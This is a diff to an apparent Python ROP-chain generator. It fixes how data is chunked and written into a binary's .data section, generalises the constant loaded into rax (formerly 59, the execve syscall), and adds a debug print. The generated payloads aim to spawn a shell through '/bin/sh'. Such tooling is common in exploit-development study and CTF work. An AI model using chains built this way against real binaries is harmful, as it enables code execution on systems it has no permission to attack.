@@ -154,7 +154,7 @@ def changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, fd) :
                     fd.write("\n\t")
 
                     counter = counter + 1
-                
+                    print(counter)
                 return 1
             
             # Case: "add Reg, -1; ret"
@@ -328,7 +328,7 @@ def LoadConstIntoReg(GadgetList, Reg, Const, fd) :
             fd.write("\n\t")
             
             if int(Const) != 0 : 
-                if changeRegValue(GadgetList, "rax", 0, 59, fd) == 0: 
+                if changeRegValue(GadgetList, "rax", 0, Const, fd) == 0: 
                     print("Unable to find gadgets which can change rax's value")
                     print("Exiting...")
                     sys.exit()
@@ -359,15 +359,12 @@ def WriteStuffIntoMemory(data, addr, fd) :
     while len(data) > 0 : 
 
         if len(data) <= 8: 
-            data_piece = data[count:]
-            # count = count + len(data)
+            data_piece = data
             data = ''
-
+        
         else : 
-            data_piece = data[count:8]
-            count = count + 8
-            data = data[count:]
-            # count = count + 8
+            data_piece = data[:8]
+            data = data[8:]
 
         # Execute popGadget1 => Reg1 will have .data's address
         fd.write("payload += struct.pack('<Q', ")
@@ -382,6 +379,7 @@ def WriteStuffIntoMemory(data, addr, fd) :
         fd.write(")")
         fd.write("\t\t# Address of .data section")
         fd.write("\n\t")
+        addr = addr + 8
 
     
         # Execute popGadget2 => Reg2 will have "/bin/sh"
@@ -395,7 +393,7 @@ def WriteStuffIntoMemory(data, addr, fd) :
         fd.write("payload += struct.pack('<Q', ")
         fd.write(hex(int.from_bytes(data_piece, byteorder = 'little')))
         fd.write(")")
-        fd.write("\t\t# ascii of '/bin//sh'")
+        # fd.write("\t\t# ascii of '/bin//sh'")
         fd.write("\n\t")
 
         # Execute movGadget - "mov qword ptr[Reg1], Reg2", ret"
